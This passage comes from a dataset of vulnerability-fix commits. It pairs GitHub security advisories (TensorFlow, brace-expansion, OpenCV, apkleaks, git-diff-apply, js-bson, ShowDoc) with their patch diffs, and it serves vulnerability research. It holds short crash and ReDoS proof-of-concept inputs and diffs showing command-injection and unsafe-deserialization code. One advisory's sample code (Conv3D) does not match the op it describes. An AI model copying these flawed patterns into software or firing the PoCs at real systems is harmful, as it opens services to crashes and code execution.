forgery.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/63447b369973724f0d352a006f25af6ff71ae292","commit_sha":"63447b369973724f0d352a006f25af6ff71ae292","patch":"SINGLE","chain_ord":"['63447b369973724f0d352a006f25af6ff71ae292']","before_first_fix_commit":"{'d61ad9db07ef09652a3deb24c26274da2ded1493'}","last_fix_commit":"63447b369973724f0d352a006f25af6ff71ae292","chain_ord_pos":1.0,"commit_datetime":"02\/02\/2022, 11:06:34","message":"Update api.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/MicroweberPackages\/Content\/routes\/api.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/63447b369973724f0d352a006f25af6ff71ae292\/src%2FMicroweberPackages%2FContent%2Froutes%2Fapi.php', 'patch': \"@@ -75,7 +75,7 @@\\n \\n         Route::post('content\/delete', function (\\\\Illuminate\\\\Http\\\\Request $request) {\\n             return mw()->content_manager->helpers->delete($request->all());\\n-        });\\n+        }); \\n \\n         Route::get('content\/get_link_admin', function (\\\\Illuminate\\\\Http\\\\Request $request) {\"}}","message_norm":"update api.php","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Content\/routes\/api.php'])","num_files":1.0},{"index":1109,"vuln_id":"GHSA-8278-88vv-x98r","cwe_id":"{'CWE-502'}","score":0.0,"chain":"{'https:\/\/github.com\/tenable\/integration-jira-cloud\/commit\/f8c2095fd529e664e7fa25403a0a4a85bb3907d0'}","dataset":"osv","summary":"Execution of untrusted code through config file ### Impact\nIt is possible to run arbitrary commands through the yaml.load() method.  This could allow an attacker with local access to the host to run arbitrary code by running the application with a specially crafted YAML configuration file.\n\n### Workarounds\nManually adjust yaml.load() to yaml.safe_load()\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [tenable\/integration-jira-cloud](https:\/\/github.com\/tenable\/integration-jira-cloud\/issues)\n* Email us at [vulnreport@tenable.com](mailto:vulnreport@tenable.com)","published_date":"2021-03-10","chain_len":1,"project":"https:\/\/github.com\/tenable\/integration-jira-cloud","commit_href":"https:\/\/github.com\/tenable\/integration-jira-cloud\/commit\/f8c2095fd529e664e7fa25403a0a4a85bb3907d0","commit_sha":"f8c2095fd529e664e7fa25403a0a4a85bb3907d0","patch":"SINGLE","chain_ord":"['f8c2095fd529e664e7fa25403a0a4a85bb3907d0']","before_first_fix_commit":"{'fa838db45f1ae5581a47e1965f74919c12488cf5'}","last_fix_commit":"f8c2095fd529e664e7fa25403a0a4a85bb3907d0","chain_ord_pos":1.0,"commit_datetime":"03\/04\/2021, 14:58:38","message":"switched yaml.load() to yaml.safe_load() to not load serialized python objects.","author":"Steve McGrath","comments":"{'com_1': {'author': 'rabby28698869', 'datetime': '03\/11\/2021, 03:07:50', 'body': 'f8c2095'}, 'com_2': {'author': 'SteveMcGrath', 'datetime': '03\/11\/2021, 15:23:59', 'body': '?'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tenable_jira\/cli.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tenable\/integration-jira-cloud\/raw\/f8c2095fd529e664e7fa25403a0a4a85bb3907d0\/tenable_jira%2Fcli.py', 'patch': \"@@ -62,7 +62,7 @@ def cli(configfile, observed_since, setup_only=False, troubleshoot=False):\\n     '''\\n     # Load the config, but ensure that any additional fields are additive to the\\n     # basic field set.\\n-    config_from_file = yaml.load(configfile, Loader=yaml.Loader)\\n+    config_from_file = yaml.safe_load(configfile)\\n     fields = config_from_file.pop('custom_fields', list())\\n     config = dict_merge(base_config(), config_from_file)\\n     config['fields'] = config['fields'] + fields\"}}","message_norm":"switched yaml.load() to yaml.safe_load() to not load serialized python objects.","language":"en","entities":"[('serialized', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tenable_jira\/cli.py'])","num_files":1.0},{"index":1110,"vuln_id":"GHSA-828x-qc2p-wprq","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a3d9f9be9ac2296615644061b40cefcee341dcc4'}","dataset":"osv","summary":"Undefined behavior in `MaxPool3DGradGrad` ### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/72fe792967e7fd25234342068806707bbc116618\/tensorflow\/core\/kernels\/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a3d9f9be9ac2296615644061b40cefcee341dcc4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a3d9f9be9ac2296615644061b40cefcee341dcc4","commit_sha":"a3d9f9be9ac2296615644061b40cefcee341dcc4","patch":"SINGLE","chain_ord":"['a3d9f9be9ac2296615644061b40cefcee341dcc4']","before_first_fix_commit":"{'72fe792967e7fd25234342068806707bbc116618'}","last_fix_commit":"a3d9f9be9ac2296615644061b40cefcee341dcc4","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 22:20:14","message":"Add missing validation to pooling_ops_3d\n\nPiperOrigin-RevId: 372218727\nChange-Id: I6b9ed4266aa7286c02f1f230d7bea922c1be547e","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/pooling_ops_3d.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a3d9f9be9ac2296615644061b40cefcee341dcc4\/tensorflow%2Fcore%2Fkernels%2Fpooling_ops_3d.cc', 'patch': '@@ -698,6 +698,19 @@ class MaxPooling3dGradGradOp : public OpKernel {\\n     OP_REQUIRES_OK(context, context->forward_input_or_allocate_output(\\n                                 {2}, 0, tensor_out.shape(), &output));\\n \\n+    \/\/ Given access patterns in LaunchMaxPooling3dGradGradOp, these tensors must\\n+    \/\/ have elements.\\n+    OP_REQUIRES(context, tensor_in.NumElements() > 0,\\n+                errors::InvalidArgument(\"received empty tensor tensor_in: \",\\n+                                        tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.NumElements() > 0,\\n+                errors::InvalidArgument(\"received empty tensor tensor_out: \",\\n+                                        tensor_out.DebugString()));\\n+    OP_REQUIRES(\\n+        context, out_grad_backprop.NumElements() > 0,\\n+        errors::InvalidArgument(\"received empty tensor out_grad_backprop: \",\\n+                                out_grad_backprop.DebugString()));\\n+\\n     LaunchMaxPooling3dGradGradOp<Device, T>::launch(\\n         context, params, tensor_in, tensor_out, out_grad_backprop, output);\\n   }'}}","message_norm":"add missing validation to pooling_ops_3d\n\npiperorigin-revid: 372218727\nchange-id: i6b9ed4266aa7286c02f1f230d7bea922c1be547e","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('372218727', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/pooling_ops_3d.cc'])","num_files":1.0},{"index":1112,"vuln_id":"GHSA-82j4-vr25-x394","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/78522520892d4e29cc94148c6ec84a204a607b73'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting due to unrestricted file upload in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/78522520892d4e29cc94148c6ec84a204a607b73","commit_sha":"78522520892d4e29cc94148c6ec84a204a607b73","patch":"SINGLE","chain_ord":"['78522520892d4e29cc94148c6ec84a204a607b73']","before_first_fix_commit":"{'52d1d902084387bec22a64e6027f100e939733c8', '830c89a4c2c5fd0dd491422bf8e97b4eb5713f55'}","last_fix_commit":"78522520892d4e29cc94148c6ec84a204a607b73","chain_ord_pos":1.0,"commit_datetime":"03\/13\/2022, 10:39:59","message":"Merge pull request #1629 from ajaysenr\/master\n\nUpdate AttachmentModel.class.php","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/78522520892d4e29cc94148c6ec84a204a607b73\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -304,6 +304,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \"%\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xxhtml\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".aspx\")\\t\\t\\t\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}'}}","message_norm":"merge pull request #1629 from ajaysenr\/master\n\nupdate attachmentmodel.class.php","language":"en","entities":"[('#1629', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":1118,"vuln_id":"GHSA-832h-xg76-4gv6","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/35\/commits\/b13381281cead487cbdbfd6a69fb097ea5e456c3'}","dataset":"osv","summary":"ReDoS in brace-expansion Affected versions of `brace-expansion` are vulnerable to a regular expression denial of service condition.\n\n## Proof of Concept\n\n```\nvar expand = require('brace-expansion');\nexpand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\n}');\n```\n\n\n## Recommendation\n\nUpdate to version 1.1.7 or later.","published_date":"2018-01-29","chain_len":1,"project":"https:\/\/github.com\/juliangruber\/brace-expansion","commit_href":"https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/35\/commits\/b13381281cead487cbdbfd6a69fb097ea5e456c3","commit_sha":"b13381281cead487cbdbfd6a69fb097ea5e456c3","patch":"SINGLE","chain_ord":"['b13381281cead487cbdbfd6a69fb097ea5e456c3']","before_first_fix_commit":"{'265f6cd6586383eebebbfc3c45da2eaa153d9e63'}","last_fix_commit":"b13381281cead487cbdbfd6a69fb097ea5e456c3","chain_ord_pos":1.0,"commit_datetime":"04\/07\/2017, 02:32:55","message":"fix bug in https:\/\/github.com\/juliangruber\/brace-expansion\/issues\/33","author":"mengyuan.ymy","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/juliangruber\/brace-expansion\/raw\/b13381281cead487cbdbfd6a69fb097ea5e456c3\/index.js', 'patch': \"@@ -106,7 +106,7 @@ function expand(str, isTop) {\\n   var isNumericSequence = \/^-?\\\\d+\\\\.\\\\.-?\\\\d+(?:\\\\.\\\\.-?\\\\d+)?$\/.test(m.body);\\n   var isAlphaSequence = \/^[a-zA-Z]\\\\.\\\\.[a-zA-Z](?:\\\\.\\\\.-?\\\\d+)?$\/.test(m.body);\\n   var isSequence = isNumericSequence || isAlphaSequence;\\n-  var isOptions = \/^(.*,)+(.+)?$\/.test(m.body);\\n+  var isOptions = m.body.indexOf(',') >= 0;\\n   if (!isSequence && !isOptions) {\\n     \/\/ {a},b}\\n     if (m.post.match(\/,.*\\\\}\/)) {\"}}","message_norm":"fix bug in https:\/\/github.com\/juliangruber\/brace-expansion\/issues\/33","language":"en","entities":"[('fix', 'ACTION', ''), ('bug', 'FLAW', ''), ('https:\/\/github.com\/juliangruber\/brace-expansion\/issues\/33', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1120,"vuln_id":"GHSA-83rh-hx5x-q9p5","cwe_id":"{'CWE-125'}","score":7.5,"chain":"{'https:\/\/github.com\/opencv\/opencv\/pull\/10480\/commits\/4ca89db22dea962690f31c1781bce5937ee91837'}","dataset":"osv","summary":"Out-of-bounds Read in OpenCV In OpenCV 3.3.1 (corresponding with OpenCV-Python 3.3.1.11), a heap-based buffer over-read exists in the function cv::HdrDecoder::checkSignature in modules\/imgcodecs\/src\/grfmt_hdr.cpp.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/opencv\/opencv","commit_href":"https:\/\/github.com\/opencv\/opencv\/pull\/10480\/commits\/4ca89db22dea962690f31c1781bce5937ee91837","commit_sha":"4ca89db22dea962690f31c1781bce5937ee91837","patch":"SINGLE","chain_ord":"['4ca89db22dea962690f31c1781bce5937ee91837']","before_first_fix_commit":"{'30373d2566a3ec097f0418dc2661ec03fcfb71d6'}","last_fix_commit":"4ca89db22dea962690f31c1781bce5937ee91837","chain_ord_pos":1.0,"commit_datetime":"01\/01\/2018, 13:12:21","message":"imgproc(hdr): fix bounds check in HdrDecoder::checkSignature()","author":"Alexander Alekhin","comments":null,"stats":"{'additions': 8, 'deletions': 4, 'total': 12}","files":"{'modules\/imgcodecs\/src\/grfmt_hdr.cpp': {'additions': 8, 'deletions': 4, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencv\/opencv\/raw\/4ca89db22dea962690f31c1781bce5937ee91837\/modules%2Fimgcodecs%2Fsrc%2Fgrfmt_hdr.cpp', 'patch': '@@ -101,10 +101,14 @@ bool HdrDecoder::readData(Mat& _img)\\n \\n bool HdrDecoder::checkSignature( const String& signature ) const\\n {\\n-    if(signature.size() >= m_signature.size() &&\\n-       (!memcmp(signature.c_str(), m_signature.c_str(), m_signature.size()) ||\\n-       !memcmp(signature.c_str(), m_signature_alt.c_str(), m_signature_alt.size())))\\n-       return true;\\n+    if (signature.size() >= m_signature.size() &&\\n+        0 == memcmp(signature.c_str(), m_signature.c_str(), m_signature.size())\\n+    )\\n+        return true;\\n+    if (signature.size() >= m_signature_alt.size() &&\\n+        0 == memcmp(signature.c_str(), m_signature_alt.c_str(), m_signature_alt.size())\\n+    )\\n+        return true;\\n     return false;\\n }'}}","message_norm":"imgproc(hdr): fix bounds check in hdrdecoder::checksignature()","language":"en","entities":"[('bounds check', 'SECWORD', ''), ('hdrdecoder::checksignature', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/imgcodecs\/src\/grfmt_hdr.cpp'])","num_files":1.0},{"index":1121,"vuln_id":"GHSA-83rx-c8cr-6j8q","cwe_id":"{'CWE-829'}","score":5.9,"chain":"{'https:\/\/github.com\/naptha\/tesseract.js\/commit\/679eba055f2a4271558e86beec3d1b70cae3fb28'}","dataset":"osv","summary":"Insecure Default Configuration in tesseract.js Versions of `tesseract.js` prior to 1.0.19 default to using a third-party proxy.  Requests may be proxied through `crossorigin.me` which clearly states is not suitable for production use. This may lead to instability and privacy violations.\n\n\n## Recommendation\n\nUpgrade to version 1.0.19 or later.","published_date":"2019-06-05","chain_len":1,"project":"https:\/\/github.com\/naptha\/tesseract.js","commit_href":"https:\/\/github.com\/naptha\/tesseract.js\/commit\/679eba055f2a4271558e86beec3d1b70cae3fb28","commit_sha":"679eba055f2a4271558e86beec3d1b70cae3fb28","patch":"SINGLE","chain_ord":"['679eba055f2a4271558e86beec3d1b70cae3fb28']","before_first_fix_commit":"{'06d32c6804acbf1f5af1c13966cb72a4ff864ecb'}","last_fix_commit":"679eba055f2a4271558e86beec3d1b70cae3fb28","chain_ord_pos":1.0,"commit_datetime":"02\/16\/2019, 12:34:36","message":"Add stubs for error handling","author":"HoldYourWaffle","comments":null,"stats":"{'additions': 11, 'deletions': 6, 'total': 17}","files":"{'src\/browser\/index.js': {'additions': 11, 'deletions': 6, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/naptha\/tesseract.js\/raw\/679eba055f2a4271558e86beec3d1b70cae3fb28\/src%2Fbrowser%2Findex.js', 'patch': '@@ -52,25 +52,30 @@ function loadImage(image, cb){\\n             var im = new Image\\n             im.src = image;\\n             im.onload = e => loadImage(im, cb);\\n+            \/\/im.onerror = e => ?; TODO handle error\\n             return\\n         }else{\\n             var xhr = new XMLHttpRequest();\\n             xhr.open(\\'GET\\', image, true)\\n             xhr.responseType = \"blob\";\\n-            xhr.onload = e => loadImage(xhr.response, cb);\\n-            xhr.onerror = function(e){\\n-                if(\/^https?:\\\\\/\\\\\/\/.test(image) && !\/^https:\\\\\/\\\\\/crossorigin.me\/.test(image)){\\n-                    console.debug(\\'Attempting to load image with CORS proxy\\')\\n-                    loadImage(\\'https:\/\/crossorigin.me\/\\' + image, cb)\\n+            \\n+            xhr.onload = e => {\\n+                if (xhr.status >= 400){\\n+                    \/\/TODO handle error\\n+                }else{\\n+                    loadImage(xhr.response, cb);\\n                 }\\n-            }\\n+            };\\n+            \/\/xhr.onerror = e => ?; TODO handle error\\n+            \\n             xhr.send(null)\\n             return\\n         }\\n     }else if(image instanceof File){\\n         \/\/ files\\n         var fr = new FileReader()\\n         fr.onload = e => loadImage(fr.result, cb);\\n+        \/\/fr.onerror = e => ?; TODO handle error\\n         fr.readAsDataURL(image)\\n         return\\n     }else if(image instanceof Blob){'}}","message_norm":"add stubs for error handling","language":"da","entities":"[('add', 'ACTION', ''), ('error handling', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/browser\/index.js'])","num_files":1.0},{"index":1123,"vuln_id":"GHSA-8434-v7xw-8m9x","cwe_id":"{'CWE-88', 'CWE-78'}","score":9.3,"chain":"{'https:\/\/github.com\/dwisiswant0\/apkleaks\/commit\/a966e781499ff6fd4eea66876d7532301b13a382'}","dataset":"osv","summary":"Improper Neutralization of Argument Delimiters in a Decompiling Package Process in APKLeaks APKLeaks prior to v2.0.4 allows remote authenticated attackers to execute arbitrary OS commands via package name inside the application manifest.\n\n### Impact\n\nAn authenticated attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified, or could cause other unintended behavior through malicious package names.\n\n\n### References\n\n- a966e781499ff6fd4eea66876d7532301b13a382\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email me at [me@dw1.io](mailto:me@dw1.io)","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/dwisiswant0\/apkleaks","commit_href":"https:\/\/github.com\/dwisiswant0\/apkleaks\/commit\/a966e781499ff6fd4eea66876d7532301b13a382","commit_sha":"a966e781499ff6fd4eea66876d7532301b13a382","patch":"SINGLE","chain_ord":"['a966e781499ff6fd4eea66876d7532301b13a382']","before_first_fix_commit":"{'8577b7af6224bf0a5455b552963c46721308d2ff'}","last_fix_commit":"a966e781499ff6fd4eea66876d7532301b13a382","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2021, 15:25:42","message":"Escapes decompiling arguments","author":"Dwi Siswanto","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'apkleaks\/apkleaks.py': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dwisiswant0\/apkleaks\/raw\/a966e781499ff6fd4eea66876d7532301b13a382\/apkleaks%2Fapkleaks.py', 'patch': '@@ -2,6 +2,7 @@\\n from apkleaks.colors import clr\\n from contextlib import closing\\n from distutils.spawn import find_executable\\n+from pipes import quote\\n from pyaxmlparser import APK\\n from urllib.request import urlopen\\n from zipfile import ZipFile\\n@@ -84,8 +85,9 @@ def decompile(self):\\n \\t\\t\\t\\t\\tclasses.write(zipped.read(\"classes.dex\"))\\n \\t\\t\\texcept Exception as e:\\n \\t\\t\\t\\tsys.exit(self.writeln(str(e), clr.WARNING))\\n-\\t\\tdec = \"%s %s -d %s --deobf\" % (self.jadx, dex, self.tempdir)\\n-\\t\\tos.system(dec)\\n+\\t\\targs = [self.jadx, dex, \"-d\", self.tempdir, \"--deobf\"]\\n+\\t\\tcomm = \"%s\" % (\" \".join(quote(arg) for arg in args))\\n+\\t\\tos.system(comm)\\n \\t\\treturn self.tempdir\\n \\n \\tdef unique(self, list):'}}","message_norm":"escapes decompiling arguments","language":"ca","entities":"[('escapes', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['apkleaks\/apkleaks.py'])","num_files":1.0},{"index":1126,"vuln_id":"GHSA-8462-q7x7-g2x4","cwe_id":"{'CWE-400', 'CWE-185'}","score":7.5,"chain":"{'https:\/\/github.com\/mongodb\/js-bson\/commit\/bd61c45157c53a1698ff23770160cf4783e9ea4a'}","dataset":"osv","summary":"High severity vulnerability that affects bson The MongoDB bson JavaScript module (also known as js-bson) versions 0.5.0 to 1.0.x before 1.0.5 is vulnerable to a Regular Expression Denial of Service (ReDoS) in lib\/bson\/decimal128.js. The flaw is triggered when the Decimal128.fromString() function is called to parse a long untrusted string.","published_date":"2018-09-17","chain_len":1,"project":"https:\/\/github.com\/mongodb\/js-bson","commit_href":"https:\/\/github.com\/mongodb\/js-bson\/commit\/bd61c45157c53a1698ff23770160cf4783e9ea4a","commit_sha":"bd61c45157c53a1698ff23770160cf4783e9ea4a","patch":"SINGLE","chain_ord":"['bd61c45157c53a1698ff23770160cf4783e9ea4a']","before_first_fix_commit":"{'e403bd94faadee80cd82bae888e28b8b4d6d1e8d'}","last_fix_commit":"bd61c45157c53a1698ff23770160cf4783e9ea4a","chain_ord_pos":1.0,"commit_datetime":"02\/26\/2018, 20:09:27","message":"fix(decimal128): add basic guard against REDOS attacks\n\nThis is a naive approach to reducing the efficacy of a REDOS attack\nagainst this module. A refactor of the regular expression or a\ncustom parser substitute would be ideal, however this solution\nsuffices as a stopgap until such work is completed.\n\nMany thanks to James Davis who graciously alterted us to the\nattack","author":"Matt Broadstone","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'lib\/bson\/decimal128.js': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mongodb\/js-bson\/raw\/bd61c45157c53a1698ff23770160cf4783e9ea4a\/lib%2Fbson%2Fdecimal128.js', 'patch': \"@@ -235,6 +235,13 @@ Decimal128.fromString = function(string) {\\n   \/\/ Trim the string\\n   string = string.trim();\\n \\n+  \/\/ Naively prevent against REDOS attacks.\\n+  \/\/ TODO: implementing a custom parsing for this, or refactoring the regex would yield\\n+  \/\/       further gains.\\n+  if (string.length >= 7000) {\\n+    throw new Error('' + string + ' not a valid Decimal128 string');\\n+  }\\n+\\n   \/\/ Results\\n   var stringMatch = string.match(PARSE_STRING_REGEXP);\\n   var infMatch = string.match(PARSE_INF_REGEXP);\"}}","message_norm":"fix(decimal128): add basic guard against redos attacks\n\nthis is a naive approach to reducing the efficacy of a redos attack\nagainst this module. a refactor of the regular expression or a\ncustom parser substitute would be ideal, however this solution\nsuffices as a stopgap until such work is completed.\n\nmany thanks to james davis who graciously alterted us to the\nattack","language":"en","entities":"[('fix(decimal128', 'ACTION', ''), ('add', 'ACTION', ''), ('redos', 'SECWORD', ''), ('attacks', 'FLAW', ''), ('redos', 'SECWORD', ''), ('attack', 'FLAW', ''), ('attack', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/bson\/decimal128.js'])","num_files":1.0},{"index":1127,"vuln_id":"GHSA-84cm-v6jp-gjmr","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/kellyselden\/git-diff-apply\/commit\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5'}","dataset":"osv","summary":"OS command injection in git-diff-apply In \"index.js\" file line 240, the run command executes the git command with a user controlled variable called remoteUrl. This affects git-diff-apply all versions prior to 0.22.2.","published_date":"2020-02-14","chain_len":1,"project":"https:\/\/github.com\/kellyselden\/git-diff-apply","commit_href":"https:\/\/github.com\/kellyselden\/git-diff-apply\/commit\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5","commit_sha":"106d61d3ae723b4257c2a13e67b95eb40a27e0b5","patch":"SINGLE","chain_ord":"['106d61d3ae723b4257c2a13e67b95eb40a27e0b5']","before_first_fix_commit":"{'bfcc903a961d9f17bde1889cf49745a2dffefd73'}","last_fix_commit":"106d61d3ae723b4257c2a13e67b95eb40a27e0b5","chain_ord_pos":1.0,"commit_datetime":"01\/06\/2020, 12:05:14","message":"spawn git clone\n\nto prevent injecting a command","author":"Kelly Selden","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/index.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kellyselden\/git-diff-apply\/raw\/106d61d3ae723b4257c2a13e67b95eb40a27e0b5\/src%2Findex.js', 'patch': \"@@ -18,6 +18,7 @@ const resolveConflicts = require('.\/resolve-conflicts');\\n const commitAndTag = require('.\/commit-and-tag');\\n const gitRemoveAll = require('.\/git-remove-all');\\n const createCustomRemote = require('.\/create-custom-remote');\\n+const { runWithSpawn } = require('.\/run');\\n \\n const { isGitClean } = gitStatus;\\n const { gitConfigInit } = gitInit;\\n@@ -222,7 +223,7 @@ module.exports = async function gitDiffApply({\\n     _tmpDir = await tmpDir();\\n     tmpWorkingDir = _tmpDir;\\n \\n-    await utils.run(`git clone ${remoteUrl} ${_tmpDir}`);\\n+    await runWithSpawn('git', ['clone', remoteUrl, _tmpDir]);\\n \\n     \/\/ needed because we are going to be committing in here\\n     await gitConfigInit({ cwd: _tmpDir });\"}}","message_norm":"spawn git clone\n\nto prevent injecting a command","language":"en","entities":"[('prevent', 'ACTION', ''), ('injecting a command', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.js'])","num_files":1.0},{"index":1133,"vuln_id":"GHSA-84mw-34w6-2q43","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b055b9c474cd376259dde8779908f9eeaf097d93'}","dataset":"osv","summary":"Null pointer dereference via invalid Ragged Tensors ### Impact\nCalling `tf.raw_ops.RaggedTensorToVariant` with arguments specifying an invalid ragged tensor results in a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])\n```\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThe implementation of [`RaggedTensorToVariant` operations](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/904b3926ed1c6c70380d5313d282d248a776baa1\/tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc#L39-L40) does not validate that the ragged tensor argument is non-empty:\n\n```cc\n  int ragged_rank = batched_ragged.ragged_rank();\n  auto batched_splits_top_vec = batched_ragged.splits(0).vec<SPLIT_TYPE>();\n```\n\nSince `batched_ragged` contains no elements, `batched_ragged.splits` is a null vector, thus `batched_ragged.splits(0)` will result in  dereferencing `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [b055b9c474cd376259dde8779908f9eeaf097d93](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b055b9c474cd376259dde8779908f9eeaf097d93).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also 